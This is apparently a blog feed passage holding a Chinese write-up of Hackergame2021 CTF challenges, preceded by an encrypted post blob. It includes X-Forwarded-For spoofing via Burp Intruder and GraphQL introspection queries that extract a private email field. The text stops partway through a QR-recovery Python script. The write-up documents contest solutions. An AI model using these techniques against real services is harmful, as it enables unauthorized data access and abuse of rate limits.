x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&#x2F;UW6v9EGe0+hA8Ii&#x2F;Bq5Idw&#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&#x2F;gpPbeyS1TqY71Gib1CW&#x2F;lWfIO&#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&#x2F;1uefrNO3ExZh3Ea9Ac3428&#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&#x2F;+Ol6DndvqxVSUjYEJCrmqp&#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&#x2F;jwWR9xz0B&#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&#x2F;QQ3YW+yq&#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&#x2F;hYcgcCEOiOcVTRWL&#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&#x2F;pdZIvF0LtjzRxgD5&#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&#x2F;&#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> SchoolBus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame2021 部分WriteUp</title>
      <link href="/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/"/>
      <url>/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="WriteUp-by-YYY"><a href="#WriteUp-by-YYY" class="headerlink" title="WriteUp by YYY"></a>WriteUp by YYY</h1><hr><h2 id="一点碎碎念"><a href="#一点碎碎念" class="headerlink" title="一点碎碎念"></a>一点碎碎念</h2><p>这是我的第一次Hackergame&#x2F;CTF比赛，感觉很有意思。前几天心态有点崩，好在调整过来了。大家还是要把Hackergame当做game。最开心的是认识了好多大佬，抱大腿.jpg  </p><p><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png" alt="emoji" loading="lazy"></p><p>对自己的吐槽：EasyRSA差点做出来，扩展欧几里得写错弃疗了；RAID0卡在软件没有激活码不让保存；和各种小测撞；各种体调不良，饮食睡眠不佳；晚上学校断电没法做，我又是大夜猫子……奇奇怪怪挡路的东西一直不少，归根结底还是太菜了啦。<br>总之非常感谢@TonyCrane大佬、GodSpeed大佬及群内各成员的鼓励支持帮助（膜不算）。<br>希望我能早日学会binary和math。  </p><hr><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>这题二分一下page参数即可。<br><del>鼠标连点器</del>  </p><hr><h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><p>使用Hex Editor Neo直接新建文件抄写即可。当然OCR识别也行吧。</p><hr><h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><p>下载音频后可以听出是一段人声，但是语速极快。于是使用Adobe Audition CC打开，效果-&gt;伸缩与变调放慢速度，适当调节音高就能开始听写了。可以发现这是<strong>NATO Phonetic Alphabet</strong>：</p><blockquote><p>A ALPHA<br>B BRAVO<br>C CHARLIE<br>D DELTA<br>E ECHO<br>F FOXTROT<br>G GOLF<br>H HOTEL<br>I INDIA<br>J JULIET<br>K KILO<br>L LIMA<br>M MIKE<br>N NOVEMBER<br>O OSCAR<br>P PAPA<br>Q QUEBEC<br>R ROMEO<br>S SIERRA<br>T TANGO<br>U UNIFORM<br>V VICTOR<br>W WHISKEY<br>X X-RAY<br>Y YANKEE<br>Z ZULU  </p></blockquote><hr><h2 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h2><p>General× 杂技√  </p><ol><li><p><a href="http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes">经典WebArchive</a> 第一行就有答案:20150504</p></li><li><p><a href="https://lug.ustc.edu.cn/wiki/intro/">https://lug.ustc.edu.cn/wiki/intro/</a>  </p><blockquote><p>此处资料显示是4次，但并非最新，我后来手动尝试才得知是5</p></blockquote></li><li><p><a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg">FTP服务器</a> Obviously，答案是Development Team of Library <del>后来得知网站首页news头图就有，我还找了好久</del></p></li><li><p>谷歌关键词<code>SIGBOVIK2021</code> <code>Newcomb-Benford</code>直接就能找到原论文<a href="http://sigbovik.org/2021/proceedings.pdf">http://sigbovik.org/2021/proceedings.pdf</a> 直接<code>Ctrl+F</code>找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13</p></li><li><p>谷歌关键词<code>protocol</code> <code>report</code> 找到<a href="https://www.rfc-editor.org/rfc/rfc8962.html">https://www.rfc-editor.org/rfc/rfc8962.html</a></p></li></ol><blockquote><p>6.Reporting Offenses<br>Send all your reports of possible violations and all tips about wrongdoing to <strong>&#x2F;dev&#x2F;null</strong>. The Protocol Police are listening and will take care of it.</p></blockquote><p><del>还挺幽默，一开始还真以为有police在listening</del></p><hr><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p>20不是3的倍数，乍看似乎不可能用6和9加和得到。但随便试了试，发现9斤的瓜很多很多时会溢出为-9223372036854775808，据此判断为int64溢出，判断应当在此处加以利用。<br>我们需要让这个数字稍微溢出一点，不能溢出太多。也就是略大于floor(9223372036854775808&#x2F;9)，使得溢出为-9223372036854775808以外的数字，并且让该数字到20的距离能被3整除。之后直接加回20就行（简单小学(?)算数，屡有即将做出来时加过头超过20的惨剧hhh）<br>灵感来源：<a href="https://www.bbsmax.com/A/pRdByjq65n/">CTF 两道web整数溢出题目(猫咪银行和ltshop)</a>  </p><hr><h2 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h2><p>根据题面和文件会发现这是终端的颜色代码，网络搜索终端颜色代码格式后将所有<code>[</code>前补上一个<code>\e</code>，然后<code>echo -e &quot;&#123;内容&#125;&quot;</code>就行啦。记得执行前把终端先用字符填满，不然可能画不完整。<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg" alt="chars" loading="lazy"></p><hr><h2 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h2><p><del>简简单单开个盒</del><br>旅游，海滩，汉字，说明这是国内一个海边旅游景点。<br>蓝色KFC？这可不常见，应该有不少人打卡了吧。<br>百度搜索<code>蓝色KFC</code>，第一项就是某红书的<code>秦皇岛蒂凡尼蓝秦皇岛网红打卡|国内唯一蒂芙尼蓝色肯德基</code><br>百度地图定位发现这家店是某海底世界分店，直接得到电话号码。<br><a href="https://www.earthol.org/">https://www.earthol.org/</a>上通过街景发现三个汉字“海|豚|馆”<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg" alt="building" loading="lazy"></p><p>对照地图，视线和海岸线大约成45°，推测应当在东南方向。进而发现影子西斜，应当在下午&#x2F;傍晚<br>通过绘制各个水平线找出灭点可以推测楼层（知乎有些文章有详细说明）。我的方法是找到对面楼“最矩形”变形最少的窗户判断为同一楼层，然后数，发现是13层左右（经尝试发现是14层）</p><hr><h2 id="FLAG助力大红包"><a href="#FLAG助力大红包" class="headerlink" title="FLAG助力大红包"></a>FLAG助力大红包</h2><p>既然是和ip有关，第一时间想到的就是<code>X-Forwarded-For</code>，果然成功了。因为每个<code>/8</code>ip段（也就是例如255.0.0.0-255.255.255.255）都只能算一次，我们使用BurpSuite的Intruder，将Post数据中的ip和<code>X-Forwarded-For</code>的ip首段打上标记，选择<code>Battering Ram</code>模式（让两处参数一致），构造0~255的字典，自动化访问<code>0.114.114.114</code>、<code>1.114.114.114</code>、<code>2.114.114.114</code>……<code>255.114.114.114</code>达成刚好256个助力获得flag。由于每次间隔2s，2s*256&#x3D;512s，小于题目时长限制10min&#x3D;600s所以是可行的。</p><hr><h2 id="Amnesia-轻度失忆"><a href="#Amnesia-轻度失忆" class="headerlink" title="Amnesia-轻度失忆"></a>Amnesia-轻度失忆</h2><p>直接<code>putchar()</code>逐个打印绕过即可。</p><hr><h2 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h2><p>GraphQL的利用。访问<code>/graphql?query=&#123;&#125;</code>发现存在利用可能。查阅<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">资料</a>后得知可以利用内省注入。没有UI界面我直接地址栏输入。换行替换为<code>%0A</code>后，访问<code>/graphql?query=&#123;__schema%0A&#123;types%0A&#123;name&#125;&#125;&#125;</code>得到：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__schema&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;types&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Query&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;GNote&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Int&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;String&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;GUser&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Boolean&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__Schema&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__Type&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__TypeKind&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__Field&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__InputValue&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__EnumValue&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__Directive&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;__DirectiveLocation&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>发现有个<code>GUser</code>类型。接下来访问<code>/graphql?query=&#123;__type(name:&quot;GUser&quot;)&#123;name%0Afields&#123;name%0Atype&#123;name,kind&#125;&#125;&#125;&#125;</code>爆出字段名<code>privateEmail</code>，然后直接<code>/graphql?query=&#123;user(id:1)&#123;id,privateEmail&#125;&#125;</code>得到flag.</p><hr><h2 id="赛博厨房"><a href="#赛博厨房" class="headerlink" title="赛博厨房"></a>赛博厨房</h2><ul><li>Level0：直接写</li><li>Level1：复制粘贴发现有长度限制 goto优化行数<br> 然后不会了。</li></ul><hr><h2 id="阵列恢复大师-RAID5"><a href="#阵列恢复大师-RAID5" class="headerlink" title="阵列恢复大师-RAID5"></a>阵列恢复大师-RAID5</h2><p>直接丢进RAID Reconstructor 5里面跑得到镜像文件。Windows上并没法直接读，于是丢进Diskinternals Linux Reader里读文件导出。执行getflag.py却提示<code>Did you recover my data correctly?</code>，疑惑之下换WSL(Kali Linux)执行就成功了。<br><del>吐槽：RAID0的XFS需要注册码没法搞。WSL也mount不上，看来还是虚拟机靠谱。</del></p><hr><h2 id="助记词-第一顿大餐"><a href="#助记词-第一顿大餐" class="headerlink" title="助记词-第一顿大餐"></a>助记词-第一顿大餐</h2><p>代码审计后发现目的是延迟尽可能高。用BurpSuite改包在POST数据里复制出来很多行注记词提交就有了flag1。就像这样：  </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;necessary science growth addition&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;necessary science growth addition&quot;</span><span class="punctuation">,</span></span><br><span class="line">    （重复好多好多次）</span><br><span class="line">    <span class="string">&quot;necessary science growth addition&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>如果不行CLEAR再试试。<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg" alt="clear it" loading="lazy"></p><p>小坑：token要跟上才能拿到flag，不过有时自动获取的token无效，使得flag只显示为true，因为加号没有URLEncode转义，不知道是不是bug.  </p><hr><h2 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h2><p>模拟题。大概思路是先扫一遍，把能确定的先确定下来。之后再dfs剩下的块（不需要全部求出，毕竟这题的二维码纠错拉满了）。<br>代码很丑对吧QAQ（当时不熟悉ndarray操作，全部当做list做一遍）  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># import scipy</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">627</span></span><br><span class="line">MSBLOCK = <span class="number">23</span></span><br><span class="line">QRBLOCK = <span class="number">11</span></span><br><span class="line">X, Y = <span class="number">103</span>, <span class="number">137</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ImageToMatrix</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="comment"># 读取图片</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">    <span class="comment"># 显示图片</span></span><br><span class="line"><span class="comment">#     im.show()  </span></span><br><span class="line">    width,height = im.size</span><br><span class="line">    im = im.convert(<span class="string">&quot;L&quot;</span>) </span><br><span class="line">    data = im.getdata()</span><br><span class="line">    data = np.matrix(data,dtype=<span class="string">&#x27;float&#x27;</span>)/<span class="number">255.0</span></span><br><span class="line">    new_data = np.reshape(data,(width,height))</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"><span class="comment">#     new_im = Image.fromarray(new_data)</span></span><br><span class="line"><span class="comment">#     # 显示图片</span></span><br><span class="line"><span class="comment">#     new_im.show()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MatrixToImage</span>(<span class="params">data</span>):</span><br><span class="line">    data = data*<span class="number">255</span></span><br><span class="line">    new_im = Image.fromarray(data.astype(np.uint8))</span><br><span class="line">    <span class="keyword">return</span> new_im</span><br><span class="line">    </span><br><span class="line">pre_arr =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)]</span><br><span class="line">res_arr =  [[<span class="number">1</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]</span><br><span class="line">kimeta =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]<span class="comment">#钦定了</span></span><br><span class="line">EACH = <span class="built_in">int</span>(math.ceil(MSBLOCK/QRBLOCK)) <span class="comment">#EACH=3</span></span><br><span class="line">filename = <span class="string">&#x27;pixelated_qrcode.bmp&#x27;</span></span><br><span class="line">data = ImageToMatrix(filename)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1145141919810</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">            pre_arr[i][j]=data[i].tolist()[<span class="number">0</span>][j]</span><br><span class="line">            <span class="keyword">if</span> i%QRBLOCK==<span class="number">0</span> <span class="keyword">and</span> j%QRBLOCK==<span class="number">0</span>:</span><br><span class="line">                res_arr[i//QRBLOCK][j//QRBLOCK]=<span class="built_in">int</span>(data.tolist()[i][j])</span><br><span class="line"><span class="comment"># print(pre_arr)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">check</span>(<span class="params">i,j,now</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=<span class="number">9</span> <span class="keyword">or</span> i&gt;=<span class="number">51</span> <span class="keyword">or</span> j&lt;=<span class="number">12</span> <span class="keyword">or</span> j&gt;=<span class="number">54</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (pre_arr[i*QRBLOCK+<span class="number">3</span>][j*QRBLOCK+<span class="number">3</span>] == now):<span class="comment">#随便写的offset</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (kimeta[i][j] <span class="keyword">or</span> vis[i][j]) <span class="keyword">and</span> res_arr[i][j]!=now:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRange</span>(<span class="params">i,j</span>):</span><br><span class="line">    <span class="keyword">return</span> i*QRBLOCK,j*QRBLOCK,(i+<span class="number">1</span>)*QRBLOCK-<span class="number">1</span>,(j+<span class="number">1</span>)*QRBLOCK-<span class="number">1</span> <span class="comment">#x1,y1,x2,y2</span></span><br><span class="line"></span><br><span class="line">vis =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcDelta</span>(<span class="params">Mi,Mj,fillN,comp,LUR,LUC</span>):</span><br><span class="line">    fn = fillN</span><br><span class="line">    <span class="keyword">for</span> xx <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> yy <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(xx,yy,fn&amp;<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">114514</span></span><br><span class="line">            fn = fn&gt;&gt;<span class="number">1</span></span><br><span class="line">    avr = <span class="number">0</span></span><br><span class="line">    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+<span class="number">1</span>)*MSBLOCK-<span class="number">1</span>,Y+(Mj+<span class="number">1</span>)*MSBLOCK-<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            <span class="keyword">if</span> (fillN&amp;<span 